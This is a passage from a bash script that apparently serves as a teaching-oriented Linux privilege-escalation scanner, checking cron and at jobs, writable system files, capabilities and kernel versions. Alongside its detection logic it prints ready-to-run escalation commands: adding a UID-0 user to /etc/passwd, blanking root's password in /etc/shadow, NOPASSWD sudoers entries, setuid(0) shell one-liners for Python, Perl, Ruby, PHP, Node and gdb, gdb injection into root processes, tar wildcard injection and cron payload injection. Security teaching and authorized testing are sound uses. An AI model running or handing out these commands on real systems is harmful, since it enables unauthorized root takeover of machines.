            warn "Network filesystem in fstab: $line"
        done
    fi
}

# === SCHEDULED TASKS (AT/BATCH) ===
enum_scheduled() {
    section "SCHEDULED TASKS (AT/BATCH)"
    
    explain_concept "AT & BATCH Jobs" \
        "Besides cron, 'at' and 'batch' schedule one-time tasks. May be writable or reveal information." \
        "The 'at' command schedules one-time job execution. If job files are writable or contain sensitive commands, they can be exploited." \
        "Check: atq (list jobs), at -c <job_id> (view job contents)"
    
    if command -v atq >/dev/null 2>&1; then
        local at_jobs=$(atq 2>/dev/null | wc -l)
        if [ $at_jobs -gt 0 ]; then
            info "Found $at_jobs scheduled 'at' jobs"
            atq 2>/dev/null | while read line; do
                log "  $line"
            done
            teach "View job contents: at -c <job_number>"
        fi
    fi
    
    # Check at job directory
    if [ -d /var/spool/cron/atjobs ]; then
        find /var/spool/cron/atjobs -type f -readable 2>/dev/null | while read job; do
            warn "Readable at job: $job"
        done
    fi
}
# ============================================
# Process Monitoring for Cron
# ============================================

# ============================================
# Process Monitoring for Cron
# ============================================

enum_process_monitor() {
    section "PROCESS MONITORING (Hidden Cron Jobs)"
    
    explain_concept "Process Monitoring for Cron Detection" \
        "Many cron jobs run every 1-5 minutes but aren't listed in crontab files. Monitoring processes reveals these hidden scheduled tasks." \
        "Cron jobs may be in user crontabs, system cron directories, or systemd timers. Some run so frequently they're easier to detect by watching process creation than finding their config. Root cron jobs calling writable scripts = instant privilege escalation." \
        "This check monitors for 60 seconds. Look for:\n  • Processes appearing repeatedly (every minute)\n  • Root processes calling scripts in writable locations\n  • Backup scripts, monitoring tools, cleanup tasks"
    
    warn "Monitoring processes for 60 seconds to detect frequent cron jobs..."
    warn "Press ENTER to skip this check and continue to next enumeration."
    
    local proc_log="/tmp/.procs_$$"
    local skip_monitor=false
    
    # Monitor for 60 seconds or until Enter is pressed
    for i in {1..60}; do
        # Check if Enter was pressed (non-blocking)
        if read -t 0.01; then
            skip_monitor=true
            echo ""
            info "Skipping process monitoring..."
            break
        fi
        
        ps aux >> "$proc_log"
        sleep 1
        echo -ne "\rMonitoring: $i/60 seconds (press ENTER to skip)"
    done
    echo ""
    
    # Only analyze if we collected some data and didn't skip
    if [ -f "$proc_log" ] && ! $skip_monitor; then
        # Analyze for frequent processes
        info "Analyzing for frequently running processes..."
        sort "$proc_log" | uniq -c | sort -rn | head -20 | while read count cmd; do
            if [ $count -gt 5 ]; then
                warn "Process appeared $count times: $cmd"
                
                # Check if it's a script we can write to
                local script=$(echo "$cmd" | grep -oE '/[^ ]+\.sh|/[^ ]+\.py')
                if [ -n "$script" ] && [ -w "$script" ]; then
                    critical "Frequent cron script is WRITABLE: $script"
                    vuln "This script runs frequently and is writable!"
                fi
            fi
        done
    elif $skip_monitor && [ -f "$proc_log" ]; then
        info "Partial data collected before skip - analysis skipped"
    fi
    
    # Cleanup
    rm -f "$proc_log"
    
    # Clear any remaining input
    read -t 0.01 -n 10000 discard 2>/dev/null || true
}

# === WORLD-WRITABLE DIRECTORIES ===
enum_world_writable() {
    section "WORLD-WRITABLE DIRECTORIES"
    
    explain_concept "World-Writable Locations" \
        "Directories writable by everyone can be used for exploitation staging, privilege escalation via cron, or PATH hijacking." \
        "If a cron job or SUID binary accesses files in world-writable directories, you can replace those files with malicious versions." \
        "Common targets: /tmp, /var/tmp, /dev/shm"
    
    info "World-writable directories in sensitive locations:"
    find / -path /proc -prune -o -path /sys -prune -o -type d -perm -0002 -ls 2>/dev/null | head -20 | while read line; do
        local dir=$(echo "$line" | awk '{print $NF}')
        case "$dir" in
            /tmp|/var/tmp|/dev/shm)
                ok "Expected writable: $dir"
                ;;
            *)
                warn "Unusual world-writable: $dir"
                ;;
        esac
    done
}

# === CLIPBOARD & SCREEN CONTENT ===
enum_clipboard() {
    section "CLIPBOARD & SCREEN CONTENT"
    
    explain_concept "Clipboard & Screenshots" \
        "Clipboard may contain passwords. Screenshot tools or framebuffer access can capture what users are viewing." \
        "Users copy/paste passwords. GUI applications store clipboard in X11 selections. Framebuffer (/dev/fb0) contains current screen content." \
        "Check:\n  xclip -o (X11 clipboard)\n  cat /dev/fb0 > /tmp/screen.raw (framebuffer)\n  Requires video group or X11 access"
    
    # Check for X11 display
    if [ -n "$DISPLAY" ]; then
        info "X11 display detected: $DISPLAY"
        
        if command -v xclip >/dev/null 2>&1; then
            local clip=$(xclip -o 2>/dev/null)
            if [ -n "$clip" ]; then
                warn "Clipboard content available"
                teach "Read with: xclip -o"
            fi
        fi
        
        if command -v xdotool >/dev/null 2>&1; then
            info "xdotool available - can simulate keypresses and capture keystrokes"
        fi
    fi
    
    # Check framebuffer access
    if [ -r /dev/fb0 ]; then
        warn "Framebuffer is readable"
        info "Framebuffer access: /dev/fb0"
        teach "Can capture screenshots: cat /dev/fb0 > /tmp/screen.raw"
        teach "On single-user systems, this is expected behavior"
        teach "On multi-user systems, this could expose other users' sessions"
    fi
}

# === FILE PERMISSIONS ===
enum_writable_files() {
    section "WRITABLE SENSITIVE FILES"
    
    explain_concept "Critical File Permissions" \
        "Certain files control system authentication and authorization. If writable, you can modify system behavior to gain root." \
        "Linux relies on file permissions to separate privileged operations. Misconfigured permissions break this security model. This happens from bad scripts, sloppy admins, or intentional misconfigurations for debugging." \
        "Always check: /etc/passwd, /etc/shadow, /etc/sudoers, cron files, systemd services, and any root-owned scripts."
    
    # Check /etc/passwd
    if [ -w /etc/passwd ]; then
        critical "WRITABLE /etc/passwd - Add root user: echo 'hacker:\$1\$xyz\$HASH:0:0::/root:/bin/bash' >> /etc/passwd"
        vuln "/etc/passwd is WRITABLE!"
        explain_concept "Writable /etc/passwd" \
            "This file maps usernames to UIDs and stores login information. UID 0 = root. You can add a new root user or change existing UIDs." \
            "Originally /etc/passwd stored password hashes (hence the name). Modern systems use /etc/shadow for hashes, but /etc/passwd still controls UIDs, home directories, and login shells. Root-equivalent = UID 0." \
            "Exploitation:\n  1. Generate password hash: openssl passwd -1 -salt xyz password123\n  2. Add root user: echo 'hacker:\$1\$xyz\$HASH:0:0::/root:/bin/bash' >> /etc/passwd\n  3. Login: su hacker\n  4. Or modify existing user's UID to 0"
    else
        ok "/etc/passwd is not writable (as expected)"
    fi
    
    # Check /etc/shadow
    if [ -w /etc/shadow ]; then
        critical "WRITABLE /etc/shadow - Remove root password: sed -i 's/^root:[^:]*:/root::/' /etc/shadow"
        vuln "/etc/shadow is WRITABLE!"
        explain_concept "Writable /etc/shadow" \
            "This file stores password hashes. Write access means you control authentication." \
            "After /etc/passwd vulnerability became known, Linux moved password hashes to /etc/shadow (only readable by root). If writable, you bypass all password security." \
            "Exploitation:\n  1. Remove root's password: sed -i 's/^root:[^:]*:/root::/' /etc/shadow\n  2. Then: su root (no password needed)\n  3. Or replace with known hash"
    else
        ok "/etc/shadow is not writable (as expected)"
    fi
    
    # Check /etc/sudoers
    if [ -w /etc/sudoers ]; then
        critical "WRITABLE /etc/sudoers - Add yourself: echo '$(whoami) ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers"
        vuln "/etc/sudoers is WRITABLE!"
        teach "This file controls sudo permissions. Direct root access:"
        teach "  echo '\$(whoami) ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers"
        teach "  sudo /bin/bash"
    else
        ok "/etc/sudoers is not writable (as expected)"
    fi
    
    # Check sudoers.d directory
    if [ -w /etc/sudoers.d ]; then
        critical "WRITABLE /etc/sudoers.d/ - Create sudo rule file"
        vuln "/etc/sudoers.d/ directory is WRITABLE!"
        teach "Create a new sudoers file here:"
        teach "  echo '\$(whoami) ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/pwn"
    fi
}

# === LINUX CAPABILITIES ===
enum_capabilities() {
    section "LINUX CAPABILITIES"
    
    explain_concept "Linux Capabilities" \
        "Capabilities split root's power into 38 distinct units. A binary can have specific root-like powers without full root access." \
        "Traditional Unix has only two privilege levels: root (UID 0) and everyone else. This is too coarse - a web server needs to bind to port 80 (requires root) but shouldn't be able to read all files or kill processes. Capabilities solve this by breaking root's power into specific permissions." \
        "Why capabilities exist:\n  • Principle of least privilege\n  • Avoid SUID root for simple tasks\n  • Example: ping needs raw sockets (CAP_NET_RAW) but not full root\n  • More granular than 'all or nothing'\n\nDangerous capabilities:\n  • cap_setuid = become any user including root\n  • cap_dac_override = bypass file permission checks\n  • cap_dac_read_search = read any file\n  • cap_sys_admin = broad admin powers\n  • cap_sys_ptrace = debug any process (inject code)"
    
    log ""
    teach "╔════════════════════════════════════════════════════════════╗"
    teach "║  UNDERSTANDING CAPABILITIES - THE FUNDAMENTALS"
    teach "╚════════════════════════════════════════════════════════════╝"
    teach ""
    teach "THE PROBLEM CAPABILITIES SOLVE:"
    teach ""
    teach "  Traditional Unix Security Model:"
    teach "  • Root (UID 0): Can do EVERYTHING"
    teach "  • Non-root: Can do very little"
    teach "  • No middle ground"
    teach ""
    teach "  Real-world example - ping command:"
    teach "  • Needs to send raw network packets (requires root)"
    teach "  • Solution before capabilities: Make ping SUID root"
    teach "  • Problem: Now ping runs with FULL root privileges"
    teach "  • Risk: If ping has a bug, attacker gets full root"
    teach ""
    teach "  Solution with capabilities:"
    teach "  • Give ping ONLY CAP_NET_RAW (raw socket access)"
    teach "  • ping can send packets but can't read files, kill processes, etc."
    teach "  • Much safer than full SUID root"
    teach ""
    teach "CAPABILITY vs SUID - KEY DIFFERENCES:"
    teach ""
    teach "  SUID Binary:"
    teach "  • Runs with ALL permissions of the file owner (usually root)"
    teach "  • If owner is root = full system control"
    teach "  • All or nothing approach"
    teach "  • Example: /usr/bin/passwd is SUID root"
    teach ""
    teach "  Capability-enabled Binary:"
    teach "  • Has SPECIFIC permissions only"
    teach "  • Can't do anything outside those specific capabilities"
    teach "  • Granular control"
    teach "  • Example: ping with CAP_NET_RAW can ONLY send raw packets"
    teach ""
    teach "THE 38 CAPABILITIES:"
    teach "  There are 38 distinct capabilities (as of modern kernels)."
    teach "  Each represents a specific privilege that root normally has."
    teach "  Examples:"
    teach "  • CAP_NET_BIND_SERVICE: Bind to ports < 1024"
    teach "  • CAP_NET_RAW: Use raw sockets (ping, traceroute)"
    teach "  • CAP_SETUID: Change user ID (become another user)"
    teach "  • CAP_DAC_OVERRIDE: Bypass file read/write/execute checks"
    teach "  • CAP_SYS_ADMIN: Perform system administration operations"
    teach ""
    log ""
    
    local caps_found=0
    
    if ! command -v getcap >/dev/null 2>&1; then
        warn "getcap not available (install libcap2-bin to check capabilities)"
        return
    fi
    
    info "Scanning for binaries with capabilities..."
    log ""
    
    local caps_found=0
    local has_dangerous_caps=0
    
    # First pass - check if any capabilities exist at all
    local cap_output=$(getcap -r / 2>/dev/null)
    
    if [ -z "$cap_output" ]; then
        ok "No capabilities found on this system"
        log ""
        teach "No binaries have elevated capabilities set. This is common - most"
        teach "systems use SUID instead. Capabilities are explicitly set by admins"
        teach "with the setcap command, so their absence is normal."
        return
    fi
    
    # Check if any dangerous capabilities exist
    if echo "$cap_output" | grep -qE "cap_setuid|cap_dac_override|cap_dac_read_search|cap_sys_admin|cap_sys_ptrace|cap_sys_module"; then
        has_dangerous_caps=1
    fi
    
    # Only show educational framework if dangerous capabilities found
    if [ $has_dangerous_caps -eq 1 ]; then
        log ""
        teach "╔════════════════════════════════════════════════════════════╗"
        teach "║  UNDERSTANDING CAPABILITIES - THE FUNDAMENTALS"
        teach "╚════════════════════════════════════════════════════════════╝"
        teach ""
        teach "THE PROBLEM CAPABILITIES SOLVE:"
        teach ""
        teach "  Traditional Unix Security Model:"
        teach "  • Root (UID 0): Can do EVERYTHING"
        teach "  • Non-root: Can do very little"
        teach "  • No middle ground"
        teach ""
        teach "  Real-world example - ping command:"
        teach "  • Needs to send raw network packets (requires root)"
        teach "  • Solution before capabilities: Make ping SUID root"
        teach "  • Problem: Now ping runs with FULL root privileges"
        teach "  • Risk: If ping has a bug, attacker gets full root"
        teach ""
        teach "  Solution with capabilities:"
        teach "  • Give ping ONLY CAP_NET_RAW (raw socket access)"
        teach "  • ping can send packets but can't read files, kill processes, etc."
        teach "  • Much safer than full SUID root"
        teach ""
        teach "CAPABILITY vs SUID - KEY DIFFERENCES:"
        teach ""
        teach "  SUID Binary:"
        teach "  • Runs with ALL permissions of the file owner (usually root)"
        teach "  • If owner is root = full system control"
        teach "  • All or nothing approach"
        teach "  • Example: /usr/bin/passwd is SUID root"
        teach ""
        teach "  Capability-enabled Binary:"
        teach "  • Has SPECIFIC permissions only"
        teach "  • Can't do anything outside those specific capabilities"
        teach "  • Granular control"
        teach "  • Example: ping with CAP_NET_RAW can ONLY send raw packets"
        teach ""
        log ""
    fi
    
    # Now process the capabilities
    echo "$cap_output" | while read line; do
        local bin=$(echo "$line" | awk '{print $1}')
        local caps=$(echo "$line" | awk '{print $3}')
        
        caps_found=1
        
        # Check for CAP_SETUID
        if echo "$caps" | grep -q "cap_setuid"; then
            critical "CAP_SETUID on $bin - Become root immediately"
            vuln "CAP_SETUID found: $bin"
            log ""
            teach "╔════════════════════════════════════════════════════════════╗"
            teach "║  CAP_SETUID - Change User ID Capability"
            teach "╚════════════════════════════════════════════════════════════╝"
            teach ""
            teach "WHAT IT IS:"
            teach "  CAP_SETUID allows a process to change its user ID to any user,"
            teach "  including root (UID 0). This is the same power the 'su' and"
            teach "  'sudo' commands use to switch users."
            teach ""
            teach "WHY IT EXISTS:"
            teach "  Some programs need to switch between users:"
            teach "  • Login programs (switch from login screen to your user)"
            teach "  • SSH daemon (becomes your user after authentication)"
            teach "  • su/sudo commands (change to root or other users)"
            teach ""
            teach "THE EXPLOITATION:"
            teach "  The setuid() system call changes the process's user ID."
            teach "  Normally only root can call setuid(0) to become root."
            teach "  With CAP_SETUID, ANY process can call setuid(0)!"
            teach ""
            teach "  Exploit chain:"
            teach "  1. Run the binary with CAP_SETUID"
            teach "  2. Binary inherits the CAP_SETUID capability"
            teach "  3. Make it call setuid(0) - become root"
            teach "  4. Spawn a shell - now you're root"
            teach ""
            
            local basename=$(basename "$bin")
            case $basename in
                python*|python)
                    teach "EXPLOITATION FOR PYTHON:"
                    teach "  Python can call setuid() via the os module:"
                    teach "  $bin -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
                    teach ""
                    teach "  Step by step:"
                    teach "  1. Import os module (operating system interface)"
                    teach "  2. os.setuid(0) - Change to UID 0 (root)"
                    teach "  3. os.system() - Execute /bin/bash as root"
                    teach "  4. You now have a root shell"
                    ;;
                perl)
                    teach "EXPLOITATION FOR PERL:"
                    teach "  Perl has POSIX module with setuid function:"
                    teach "  $bin -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"
                    teach ""
                    teach "  Breakdown:"
                    teach "  1. Load POSIX module"
                    teach "  2. Call setuid(0)"
                    teach "  3. exec() replaces current process with /bin/sh"
                    ;;
                ruby)
                    teach "EXPLOITATION FOR RUBY:"
                    teach "  Ruby's Process module handles user switching:"
                    teach "  $bin -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'"
                    teach ""
                    teach "  Process::Sys.setuid(0) changes to root, then spawn shell"
                    ;;
                php)
                    teach "EXPLOITATION FOR PHP:"
                    teach "  PHP has posix_setuid function:"
                    teach "  $bin -r 'posix_setuid(0); system(\"/bin/sh\");'"
                    teach ""
                    teach "  -r flag runs PHP code directly"
                    ;;
                node|nodejs)
                    teach "EXPLOITATION FOR NODE.JS:"
                    teach "  Node's process object has setuid method:"
                    teach "  $bin -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0,1,2]})'"
                    teach ""
                    teach "  process.setuid(0) becomes root, then spawn interactive shell"
                    ;;
                gdb)
                    teach "EXPLOITATION FOR GDB:"
                    teach "  GDB can execute system calls:"
                    teach "  $bin -nx -ex 'python import os; os.setuid(0)' -ex 'shell /bin/sh' -ex quit"
                    ;;
                *)
                    teach "GENERAL APPROACH:"
                    teach "  This binary can call setuid(0) to become root."
                    teach "  Research how $basename can:"
                    teach "  1. Call the setuid() system call"
                    teach "  2. Execute shell commands"
                    teach "  3. If it's a scripting language, use its setuid function"
                    teach "  4. If it's compiled, use GDB to call setuid manually"
                    teach ""
                    teach "  GDB method (works for any binary):"
                    teach "  gdb -q $bin"
                    teach "  (gdb) call (int)setuid(0)"
                    teach "  (gdb) shell /bin/sh"
                    ;;
            esac
            log ""
        fi
        
        # Check for CAP_DAC_READ_SEARCH
        if echo "$caps" | grep -q "cap_dac_read_search"; then
            critical "CAP_DAC_READ_SEARCH on $bin - Read /etc/shadow and SSH keys"
            vuln "CAP_DAC_READ_SEARCH found: $bin"
            log ""
            teach "╔════════════════════════════════════════════════════════════╗"
            teach "║  CAP_DAC_READ_SEARCH - Bypass Read Permission Checks"
            teach "╚════════════════════════════════════════════════════════════╝"
            teach ""
            teach "WHAT IT IS:"
            teach "  DAC = Discretionary Access Control (normal file permissions)"
            teach "  This capability bypasses file READ permission checks."
            teach "  You can read ANY file on the system, regardless of permissions."
            teach ""
            teach "WHY IT EXISTS:"
            teach "  Backup programs need to read all files to create backups."
            teach "  Instead of running as full root, they get CAP_DAC_READ_SEARCH."
            teach ""
            teach "WHAT YOU CAN READ:"
            teach "  • /etc/shadow (password hashes)"
            teach "  • /root/.ssh/id_rsa (root's SSH private key)"
            teach "  • /root/.bash_history (root's command history)"
            teach "  • Any user's private files"
            teach "  • Database files, configuration files, etc."
            teach ""
            teach "EXPLOITATION:"
            teach "  The binary can read files but you need to make it DO the reading."
            teach ""
            
            local basename=$(basename "$bin")
            case $basename in
                tar)
                    teach "EXPLOITATION WITH TAR:"
                    teach "  tar can archive (and thus read) any file:"
                    teach "  $bin -czf /tmp/shadow.tar.gz /etc/shadow"
                    teach "  cd /tmp && tar -xzf shadow.tar.gz"
                    teach "  cat etc/shadow"
                    teach ""
                    teach "  Now crack the hashes with john or hashcat"
                    ;;
                dd)
                    teach "EXPLOITATION WITH DD:"
                    teach "  dd reads and writes raw data:"
                    teach "  $bin if=/etc/shadow of=/tmp/shadow"
                    teach "  cat /tmp/shadow"
                    ;;
                rsync)
                    teach "EXPLOITATION WITH RSYNC:"
                    teach "  $bin /etc/shadow /tmp/shadow"
                    teach "  cat /tmp/shadow"
                    ;;
                *)
                    teach "GENERAL APPROACH:"
                    teach "  If $basename can read files, use it to read sensitive files:"
                    teach "  • /etc/shadow - crack passwords offline"
                    teach "  • /root/.ssh/id_rsa - use for SSH access"
                    teach "  • /root/.bash_history - find credentials in commands"
                    teach "  • Application config files - database passwords"
                    ;;
            esac
            log ""
        fi
        
        # Check for CAP_DAC_OVERRIDE
        if echo "$caps" | grep -q "cap_dac_override"; then
            critical "CAP_DAC_OVERRIDE on $bin - Write to any file including /etc/passwd"
            vuln "CAP_DAC_OVERRIDE found: $bin"
            log ""
            teach "╔════════════════════════════════════════════════════════════╗"
            teach "║  CAP_DAC_OVERRIDE - Bypass ALL File Permission Checks"
            teach "╚════════════════════════════════════════════════════════════╝"
            teach ""
            teach "WHAT IT IS:"
            teach "  Like CAP_DAC_READ_SEARCH, but for WRITE permissions too."
            teach "  You can READ and WRITE any file, regardless of permissions."
            teach "  This is almost as powerful as being root."
            teach ""
            teach "WHY IT EXISTS:"
            teach "  System management tools need to modify protected files."
            teach "  Package managers, system updaters, etc."
            teach ""
            teach "WHAT YOU CAN DO:"
            teach "  • Modify /etc/passwd (add root user)"
            teach "  • Modify /etc/shadow (remove root's password)"
            teach "  • Modify /etc/sudoers (give yourself sudo access)"
            teach "  • Replace /bin/bash with a backdoored version"
            teach "  • Inject SSH keys into /root/.ssh/authorized_keys"
            teach ""
            teach "EXPLOITATION STRATEGY:"
            teach "  Option 1 - Add root user to /etc/passwd:"
            teach "    echo 'hacker::0:0::/root:/bin/bash' | $bin tee -a /etc/passwd"
            teach "    su hacker (no password needed)"
            teach ""
            teach "  Option 2 - Remove root password from /etc/shadow:"
            teach "    If binary can edit files, remove the hash between first and second :"
            teach "    Before: root:\$6\$long_hash:..."
            teach "    After:  root::..."
            teach "    su root (no password)"
            teach ""
            teach "  Option 3 - Inject SSH key:"
            teach "    echo 'YOUR_PUBLIC_KEY' | $bin tee -a /root/.ssh/authorized_keys"
            teach "    ssh -i your_private_key root@localhost"
            log ""
        fi
        
        # Check for CAP_SYS_PTRACE
        if echo "$caps" | grep -q "cap_sys_ptrace"; then
            vuln "CAP_SYS_PTRACE found: $bin"
            log ""
            teach "╔════════════════════════════════════════════════════════════╗"
            teach "║  CAP_SYS_PTRACE - Debug and Inject Into Any Process"
            teach "╚════════════════════════════════════════════════════════════╝"
            teach ""
            teach "WHAT IT IS:"
            teach "  ptrace() is the system call debuggers use to inspect/control"
            teach "  other processes. CAP_SYS_PTRACE lets you debug ANY process,"
            teach "  including those owned by root."
            teach ""
            teach "WHY IT EXISTS:"
            teach "  Debuggers (gdb, strace) need to attach to processes."
            teach "  System monitoring tools need to inspect running programs."
            teach ""
            teach "EXPLOITATION:"
            teach "  If you can attach to a root process, you can:"
            teach "  1. Inject shellcode (malicious code)"
            teach "  2. Make it call system() to execute commands"
            teach "  3. Hijack its execution flow"
            teach ""
            teach "EXAMPLE - Inject into a root process:"
            teach "  1. Find a root process:"
            teach "     ps aux | grep root"
            teach "  2. Use gdb to attach:"
            teach "     gdb -p <PID>"
            teach "  3. Call system() from within the process:"
            teach "     (gdb) call (int)system(\"chmod u+s /bin/bash\")"
            teach "  4. Detach:"
            teach "     (gdb) detach"
            teach "  5. /bin/bash is now SUID root"
            teach "     /bin/bash -p"
            teach ""
            teach "SIMPLER METHOD - shellcode injection tools:"
            teach "  Use tools like 'linux-inject' to automate process injection"
            log ""
        fi
        
        # Check for CAP_SYS_ADMIN
        if echo "$caps" | grep -q "cap_sys_admin"; then
            critical "CAP_SYS_ADMIN on $bin - Nearly equivalent to root"
            vuln "CAP_SYS_ADMIN found: $bin"
            log ""
            teach "╔════════════════════════════════════════════════════════════╗"
            teach "║  CAP_SYS_ADMIN - The 'God Mode' Capability"
            teach "╚════════════════════════════════════════════════════════════╝"
            teach ""
            teach "WHAT IT IS:"
            teach "  CAP_SYS_ADMIN is a catch-all for 'system administration' tasks."
            teach "  It's extremely broad and provides many root-equivalent powers."
            teach "  Often called 'the new root' because it's so powerful."
            teach ""
            teach "WHAT IT ALLOWS:"
            teach "  • Mount filesystems"
            teach "  • Load kernel modules"
            teach "  • Perform system administration operations"
            teach "  • Manipulate namespaces"
            teach "  • Many other privileged operations"
            teach ""
            teach "WHY IT'S DANGEROUS:"
            teach "  It was supposed to be for 'admin operations that don't fit"
            teach "  other capabilities'. But so many things got added to it that"
            teach "  having CAP_SYS_ADMIN is almost the same as being root."
            teach ""
            teach "EXPLOITATION:"
            teach "  Multiple paths to root with CAP_SYS_ADMIN:"
            teach ""
            teach "  Option 1 - Mount host filesystem (if in container):"
            teach "  Option 2 - Load kernel module with backdoor"
            teach "  Option 3 - Manipulate /proc/sys to weaken security"
            teach ""
            teach "  This capability is too broad to cover all exploitation paths."
            teach "  Research specific to your situation."
            log ""
        fi
        
        # Other capabilities
        if echo "$caps" | grep -qE "cap_net_admin|cap_net_raw"; then
            info "Network capabilities: $caps on $bin"
            teach "Network capabilities detected - useful for network manipulation"
            teach "  but typically not direct privilege escalation paths"
            log ""
        fi
        
        if echo "$caps" | grep -qE "cap_sys_module"; then
            critical "CAP_SYS_MODULE on $bin - Load kernel modules"
            vuln "CAP_SYS_MODULE found: $bin"
            teach "This binary can load kernel modules - create a malicious module"
            teach "  to get root-level kernel code execution"
            log ""
        fi
    done
    
    if [ $caps_found -eq 0 ]; then
        ok "Only harmless capabilities found (network-related, not exploitable)"
        return
    fi
    
    # Only show key takeaways if we found dangerous capabilities
    if [ $has_dangerous_caps -eq 1 ]; then
        log ""
        teach "═══════════════════════════════════════════════════════════════"
        teach "CAPABILITIES - KEY TAKEAWAYS"
        teach "═══════════════════════════════════════════════════════════════"
        teach ""
        teach "MENTAL MODEL:"
        teach "  Think of capabilities as 'root lite' - specific pieces of root's"
        teach "  power distributed individually instead of all-or-nothing."
        teach ""
        teach "THE BIG THREE FOR PRIVILEGE ESCALATION:"
        teach "  1. CAP_SETUID = Can become root directly (most powerful)"
        teach "  2. CAP_DAC_OVERRIDE = Can read/write any file (almost as good)"
        teach "  3. CAP_SYS_ADMIN = Swiss army knife (way too broad)"
        teach ""
        teach "HOW TO CHECK FOR CAPABILITIES:"
        teach "  getcap -r / 2>/dev/null"
        teach "  (Searches entire filesystem for capability-enabled binaries)"
        teach ""
        teach "DEFENSIVE PERSPECTIVE:"
        teach "  Capabilities are actually a SECURITY IMPROVEMENT over SUID."
        teach "  They follow the principle of least privilege."
        teach "  But if misconfigured (like CAP_SETUID on python), they're just"
        teach "  as dangerous as SUID root."
        log ""
    fi
}
# === CRON JOBS ===
enum_cron() {
    section "CRON JOB ANALYSIS"
    
    explain_concept "Cron Jobs" \
        "Cron runs scheduled tasks as different users. If a root cron job calls a script you can write to, or uses wildcards unsafely, you control what root executes." \
        "Admins create cron jobs for backups, maintenance, monitoring. Common mistakes: writable script files, relative paths, wildcard abuse (tar * can be exploited with --checkpoint-action)." \
        "Attack vectors:\n  1. Writable script called by cron\n  2. Script in writable directory\n  3. Wildcard injection (tar *, rsync *)\n  4. PATH hijacking in cron environment"
    
    # Check system crontab
    if [ -r /etc/crontab ]; then
        info "System crontab contents:"
        grep -v "^#" /etc/crontab 2>/dev/null | grep -v "^$" | while read line; do
            log "  $line"
            
            # Extract script paths
            local script=$(echo "$line" | grep -oE '/[^ ]+\.(sh|py|pl|rb)')
            if [ -n "$script" ]; then
                if [ -w "$script" ]; then
                    critical "Writable cron script: $script - Inject payload for root execution"
                    vuln "Cron script is WRITABLE: $script"
                    teach "Inject payload: echo 'chmod u+s /bin/bash' >> $script"
                elif [ -w "$(dirname "$script")" ]; then
                    critical "Cron script directory writable: $(dirname "$script")"
                    vuln "Cron script directory is WRITABLE: $(dirname "$script")"
                    teach "Replace the script or create a symlink"
                fi
            fi
            
            # Check for wildcards (but exclude safe commands like run-parts)
            if echo "$line" | grep -qE '\*' && ! echo "$line" | grep -qE 'run-parts'; then
                warn "Cron job uses wildcards - potential for injection"
                teach "If command is 'tar -czf backup.tar.gz *', you can:"
                teach "  touch -- '--checkpoint=1'"
                teach "  touch -- '--checkpoint-action=exec=sh shell.sh'"
                teach "  When tar runs, it interprets these as arguments"
            fi
        done
    fi
    
    # Check user crontabs
    for user in $(cut -d: -f1 /etc/passwd); do
        crontab -l -u "$user" 2>/dev/null | grep -v "^#" | grep -v "^$" | while read line; do
            info "User $user cron: $line"
        done
    done
    
    # Check cron directories
    for dir in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly; do
        if [ -w "$dir" ]; then
            critical "Cron directory WRITABLE: $dir - Place malicious cron job"
            vuln "Cron directory is WRITABLE: $dir"
            teach "Create malicious cron job in this directory"
        fi
        
        if [ -d "$dir" ]; then
            find "$dir" -type f -writable 2>/dev/null | while read file; do
                critical "Writable cron file: $file"
                vuln "Writable cron file: $file"
            done
        fi
    done
}

# === KERNEL EXPLOITS ===
# === KERNEL EXPLOIT DETECTION ===
enum_kernel() {
    section "KERNEL EXPLOIT DETECTION"
    
    explain_concept "Kernel Exploits" \
        "The kernel is the core of Linux, managing hardware, processes, and security. Vulnerabilities here affect all users and often give instant root." \
        "The kernel has complete control over the system - it manages memory, processes, hardware, and enforces all security. It runs in 'ring 0' (highest privilege). Any code execution in kernel space = total system control. Unlike user-space exploits (SUID, sudo), kernel exploits work regardless of user permissions." \
        "Why kernel exploits are powerful:\n  • Bypass ALL security mechanisms (capabilities, AppArmor, SELinux)\n  • Affect ALL users on the system\n  • Escape containers (containers share host kernel)\n  • No authentication needed\n  • Universal - same exploit works across distributions\n\nWhy they exist:\n  • Kernel is millions of lines of C code\n  • Handles complex low-level operations\n  • Must support ancient hardware/features\n  • Race conditions in multi-threading\n  • Memory corruption bugs"
    
    local kernel=$(uname -r)
    local kernel_version=$(echo "$kernel" | grep -oE '^[0-9]+\.[0-9]+\.[0-9]+')
    
    info "Kernel version: $kernel"
    info "Kernel numeric version: $kernel_version"
    log ""
    
    # Parse version for comparison
    local major=$(echo "$kernel_version" | cut -d. -f1)
    local minor=$(echo "$kernel_version" | cut -d. -f2)
    local patch=$(echo "$kernel_version" | cut -d. -f3)
    
    info "Checking kernel against known exploitable vulnerabilities..."
    log ""
    
    # === Dirty Pipe (CVE-2022-0847) ===
    if [ "$major" -eq 5 ] && [ "$minor" -ge 8 ] && [ "$minor" -le 16 ]; then
        critical "Kernel vulnerable to Dirty Pipe (CVE-2022-0847) - Instant root"
        vuln "Potentially vulnerable to Dirty Pipe (CVE-2022-0847)"
        log ""
        teach "╔════════════════════════════════════════════════════════════╗"
        teach "║  CVE-2022-0847 - Dirty Pipe (Arbitrary File Overwrite)"
        teach "╚════════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT IT IS:"
        teach "  A vulnerability that allows overwriting data in read-only files"
        teach "  by exploiting how Linux handles pipe buffers. Named after the"
        teach "  similar 'Dirty COW' vulnerability from 2016."
        teach ""
        teach "WHY IT EXISTS:"
        teach "  Linux uses 'pipes' to pass data between processes (like |)."
        teach "  Pipes use special memory buffers called 'pipe buffers'."
        teach "  These buffers have flags to track their state."
        teach ""
        teach "THE BUG:"
        teach "  When merging pipe buffers, the kernel forgot to clear the"
        teach "  PIPE_BUF_FLAG_CAN_MERGE flag. This flag should be cleared"
        teach "  when data is copied into a page cache (file cache in memory)."
        teach ""
        teach "  The exploit works like this:"
        teach "  1. Open a read-only file (like /etc/passwd)"
        teach "  2. Create a pipe"
        teach "  3. Write data to the pipe that you want to inject"
        teach "  4. Splice the pipe into the target file"
        teach "  5. Because the flag wasn't cleared, kernel allows the write"
